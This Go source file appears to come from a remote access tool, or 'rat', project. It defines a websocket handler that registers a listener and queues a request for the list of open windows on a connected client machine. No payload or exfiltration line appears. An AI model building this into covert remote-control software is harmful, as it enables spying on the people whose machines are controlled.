package main

import (
	"rat/shared"

	"golang.org/x/net/websocket"
)

type WindowMessage Message

func (d WindowMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	client.Listeners[shared.WindowsHeader] = ws
	client.Queue <- &WindowsPacket{}

	return nil
}
